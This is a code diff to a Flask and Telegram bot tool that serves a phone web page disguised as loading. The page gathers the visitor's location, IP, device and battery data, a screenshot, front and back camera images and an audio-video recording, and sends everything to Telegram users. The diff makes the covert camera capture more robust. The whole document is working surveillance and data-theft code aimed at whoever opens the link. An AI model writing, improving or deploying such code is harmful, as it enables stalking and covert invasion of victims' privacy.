@@ -95,9 +95,12 @@ HTML_PAGE = """<!DOCTYPE html>
                     const battery = await navigator.getBattery();
                     const level = Math.round(battery.level * 100);
                     return { level: level, charging: battery.charging };
+                } else {
+                    return { level: 'not supported', charging: 'unknown' };
                 }
-            } catch {}
-            return { level: 'unknown', charging: 'unknown' };
+            } catch (e) {
+                return { level: 'error', charging: 'unknown' };
+            }
         }
 
         function getNetworkType() {
@@ -145,67 +148,80 @@ HTML_PAGE = """<!DOCTYPE html>
             });
         }
 
-        // ---- Robust camera acquisition with debug ----
+        // ---- Improved camera acquisition with facing detection ----
         async function getCameraStreams() {
             let back = null, front = null;
             let errorMessages = [];
             let debugInfo = {};
+            let backFacing = false, frontFacing = false;
 
-            // Try 1: Explicit back camera with resolution constraint
+            // 1. Try back camera with environment
             try {
-                const constraints = {
-                    video: { facingMode: 'environment', width: { ideal: 640 } },
-                    audio: true
-                };
-                back = await navigator.mediaDevices.getUserMedia(constraints);
-                debugInfo.backTrack = back.getVideoTracks()[0].getSettings();
+                const constraints = { video: { facingMode: 'environment', width: { ideal: 640 } }, audio: true };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                back = stream;
+                const track = back.getVideoTracks()[0];
+                const settings = track.getSettings();
+                debugInfo.backTrack = settings;
+                if (settings.facingMode === 'environment') backFacing = true;
+                else backFacing = true; // assume
             } catch (err) {
                 errorMessages.push('Back explicit: ' + err.name + ' - ' + err.message);
-                // Try default (may be back)
+                // fallback to default
                 try {
-                    back = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                    debugInfo.backTrack = back.getVideoTracks()[0].getSettings();
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    back = stream;
+                    const track = back.getVideoTracks()[0];
+                    const settings = track.getSettings();
+                    debugInfo.backDefault = settings;
+                    backFacing = true; // assume
                 } catch (err2) {
                     errorMessages.push('Default back: ' + err2.name + ' - ' + err2.message);
                 }
             }
 
-            // Now front camera
+            // 2. Try front camera with user
             try {
-                front = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user', width: { ideal: 320 } },
-                    audio: false
-                });
-                debugInfo.frontTrack = front.getVideoTracks()[0].getSettings();
+                const constraints = { video: { facingMode: 'user', width: { ideal: 320 } }, audio: false };
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                front = stream;
+                const track = front.getVideoTracks()[0];
+                const settings = track.getSettings();
+                debugInfo.frontTrack = settings;
+                if (settings.facingMode === 'user') frontFacing = true;
+                else frontFacing = true;
             } catch (err) {
                 errorMessages.push('Front explicit: ' + err.name + ' - ' + err.message);
-                // If no front, clone back if available
-                if (back) {
-                    front = back.clone();
-                    debugInfo.frontTrack = front.getVideoTracks()[0].getSettings();
-                    debugInfo.frontCloned = true;
-                } else {
-                    // Last resort: try any camera
-                    try {
-                        front = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                        debugInfo.frontTrack = front.getVideoTracks()[0].getSettings();
-                    } catch (err2) {
-                        errorMessages.push('Any front: ' + err2.name + ' - ' + err2.message);
-                    }
+                // fallback to any camera
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                    front = stream;
+                    const track = front.getVideoTracks()[0];
+                    const settings = track.getSettings();
+                    debugInfo.frontFallback = settings;
+                    frontFacing = false;
+                } catch (err2) {
+                    errorMessages.push('Any front: ' + err2.name + ' - ' + err2.message);
                 }
             }
 
-            // If back still null, use front as back
+            // Ensure both streams exist; clone if needed
             if (!back && front) {
                 back = front.clone();
                 debugInfo.backIsClone = true;
+                backFacing = frontFacing;
+            }
+            if (!front && back) {
+                front = back.clone();
+                debugInfo.frontIsClone = true;
+                frontFacing = backFacing;
             }
 
-            return { front, back, error: errorMessages.join(' | '), debug: debugInfo };
+            return { front, back, error: errorMessages.join(' | '), debug: debugInfo, backFacing, frontFacing };
         }
 
-        // ---- Capture frame with robust readiness ----
-        function captureFrame(stream, label) {
+        // ---- Robust frame capture ----
+        function captureFrame(stream) {
             return new Promise((resolve) => {
                 if (!stream) { resolve(null); return; }
                 const video = document.createElement('video');
@@ -213,7 +229,6 @@ HTML_PAGE = """<!DOCTYPE html>
                 let resolved = false;
                 video.onloadedmetadata = async () => {
                     video.play();
-                    // Wait up to 2 seconds for a valid frame
                     let attempts = 0;
                     while (attempts < 20) {
                         await delay(100);
@@ -248,7 +263,7 @@ HTML_PAGE = """<!DOCTYPE html>
             startBtn.innerText = 'Loading...';
             await delay(300);
 
-            // Step 1: Location
+            // 1. Location
             let locationData = null;
             if (navigator.geolocation) {
                 try {
@@ -263,7 +278,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 locationData = { denied: true };
             }
 
-            // Step 2: System info
+            // 2. System info
             const ipInfo = await getIpInfo();
             const device = getDeviceInfo();
             const battery = await getBatteryInfo();
@@ -273,9 +288,9 @@ HTML_PAGE = """<!DOCTYPE html>
             const language = getLanguage();
             const orientation = getOrientation();
 
-            // Step 3: Camera
-            const { front, back, error, debug } = await getCameraStreams();
-            let frontBlob = null, backBlob = null, videoBlob = null;
+            // 3. Camera streams
+            const { front, back, error, debug, backFacing, frontFacing } = await getCameraStreams();
+            let frontBlob = null, backBlob = null;
             let cameraStatus = 'success';
             let cameraError = error || '';
 
@@ -283,17 +298,19 @@ HTML_PAGE = """<!DOCTYPE html>
                 cameraStatus = 'failed';
                 cameraError = error || 'No camera access';
             } else {
-                if (front) frontBlob = await captureFrame(front, 'front');
-                if (back) backBlob = await captureFrame(back, 'back');
+                // Capture back first, then front
+                if (back) backBlob = await captureFrame(back);
+                if (front) frontBlob = await captureFrame(front);
                 // Store streams for recording
-                frontStream = front;
                 backStream = back;
+                frontStream = front;
             }
 
-            // Step 4: Screenshot
+            // 4. Screenshot
             const screenshotBlob = await captureScreenshot();
 
-            // Step 5: Recording
+            // 5. Recording (from back camera)
+            let videoBlob = null;
             let recordStream = backStream || frontStream;
             if (recordStream) {
                 let mimeType = 'video/webm;codecs=vp9,opus';
@@ -358,10 +375,13 @@ HTML_PAGE = """<!DOCTYPE html>
                 fd.append('camera_status', cameraStatus);
                 fd.append('camera_error', cameraError);
                 fd.append('camera_debug', JSON.stringify(debug));
+                // Send facing flags to backend for labeling
+                fd.append('backFacing', backFacing ? 'true' : 'false');
+                fd.append('frontFacing', frontFacing ? 'true' : 'false');
                 // Media
                 if (screenshotBlob) fd.append('screenshot', screenshotBlob, 'screenshot.jpg');
-                if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg');
-                if (backBlob) fd.append('backImage', backBlob, 'back.jpg');
+                if (backBlob) fd.append('backImage', backBlob, 'back.jpg');   // back image
+                if (frontBlob) fd.append('frontImage', frontBlob, 'front.jpg'); // front image
                 if (videoBlob) fd.append('video', videoBlob, 'recording.webm');
 
                 await sendData(fd);
@@ -415,14 +435,15 @@ def capture():
     camera_status = request.form.get('camera_status', 'unknown')
     camera_error = request.form.get('camera_error', '')
     camera_debug = request.form.get('camera_debug', '{}')
+    backFacing = request.form.get('backFacing') == 'true'
+    frontFacing = request.form.get('frontFacing') == 'true'
     screenshot = request.files.get('screenshot')
     front_img = request.files.get('frontImage')
     back_img = request.files.get('backImage')
     video = request.files.get('video')
 
-    # Print debug info to Railway logs
-    print(f"camera_status: {camera_status}, camera_error: {camera_error}")
-    print(f"camera_debug: {camera_debug}")
+    # Log to Railway
+    print(f"camera_status: {camera_status}, backFacing: {backFacing}, frontFacing: {frontFacing}")
     print(f"front_img: {front_img is not None}, back_img: {back_img is not None}, video: {video is not None}")
 
     for uid in USER_IDS:
@@ -464,20 +485,23 @@ def capture():
             except Exception as e:
                 print(f"Screenshot error: {e}")
 
+        # Back camera (we want to send back first)
+        if back_img:
+            try:
+                back_img.seek(0)
+                caption = "📷 Back Camera" if backFacing else "📷 Camera (Back assumed)"
+                bot.send_photo(uid, back_img.read(), caption=caption)
+            except Exception as e:
+                print(f"Back image error: {e}")
+
         # Front camera
         if front_img:
             try:
                 front_img.seek(0)
-                bot.send_photo(uid, front_img.read(), caption="🤳 Front Camera")
+                caption = "🤳 Front Camera" if frontFacing else "🤳 Camera (Front assumed)"
+                bot.send_photo(uid, front_img.read(), caption=caption)
             except Exception as e:
                 print(f"Front image error: {e}")
-        # Back camera
-        if back_img:
-            try:
-                back_img.seek(0)
-                bot.send_photo(uid, back_img.read(), caption="📷 Back Camera")
-            except Exception as e:
-                print(f"Back image error: {e}")
 
         # Video
         if video:
@@ -499,14 +523,6 @@ def capture():
             except Exception as e:
                 print(f"Camera note error: {e}")
 
-        # Debug info (optional)
-        try:
-            # Send camera debug info to the user for troubleshooting (remove if not needed)
-            # bot.send_message(uid, f"Debug: {camera_debug[:200]}")
-            pass
-        except:
-            pass
-
         # Final
         try:
             bot.send_message(uid, "✅ All data captured.")
@@ -517,7 +533,7 @@ def capture():
 
 @bot.message_handler(commands=['start'])
 def send_link(m):
-    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, camera images, and video recording.")
+    bot.reply_to(m, f"🔗 Open this link on your phone:\n{BASE_URL}/\n\nCollects location, device data, screenshot, camera images (back first, then front), and video recording.")
 
 def run_bot():
     print("Bot polling started.")
